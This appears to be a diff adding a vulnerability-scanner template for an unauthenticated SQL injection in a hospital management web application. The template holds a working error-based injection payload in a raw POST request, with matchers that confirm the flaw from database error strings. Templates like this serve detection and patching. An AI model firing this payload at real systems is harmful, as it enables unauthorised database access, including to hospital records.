@@ -1,0 +1,38 @@
+id: phpgurukul-hms-sqli
+
+info:
+  name: PHPGurukul HMS v4.0 - Unauthenticated SQL Injection
+  author: Sanka1pp
+  severity: critical
+  description: |
+    The PHPGurukul Hospital Management System v4.0 allows unauthenticated SQL Injection via the 'specilizationid' parameter in 'get_doctor.php'. Attackers can dump the database without credentials.
+  reference:
+    - https://packetstorm.news/files/id/213711
+    - https://github.com/Sanka1pp/PHPGurukul-HMS-CVE
+  metadata:
+    verified: true
+    max-request: 1
+  tags: phpgurukul,hms,sqli,unauth,packetstorm
+
+http:
+  - raw:
+      - |
+        POST /hospital/hms/get_doctor.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        specilizationid=ENT' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+          - "MariaDB"
+          - "MySQL"
+        condition: or
+
+      - type: status
+        status:
+          - 200
